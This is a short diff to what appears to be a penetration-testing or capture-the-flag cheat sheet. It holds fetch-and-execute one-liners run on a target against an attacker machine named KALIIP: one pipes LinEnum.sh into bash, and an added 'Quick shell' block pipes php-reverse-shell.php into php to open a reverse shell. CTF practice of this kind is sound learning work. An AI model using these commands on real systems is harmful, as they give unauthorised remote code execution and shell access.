@@ -961,12 +961,20 @@ base64 -d pastedfile
 md5sum both to ensure accurate completion
 ```
 # Quick file transfer & execute scripts
+```
 on attack
 python -m SimpleHTTPServer 8080
 
 on target
 curl KALIIP:8080/LinEnum.sh | bash
 LinEnum as example
+```
+```
+Quick shell
+
+on target
+curl http://KALIIP/php-reverse-shell.php | php
+```
 
 ## Best wordlists for quick ctfs
 ```
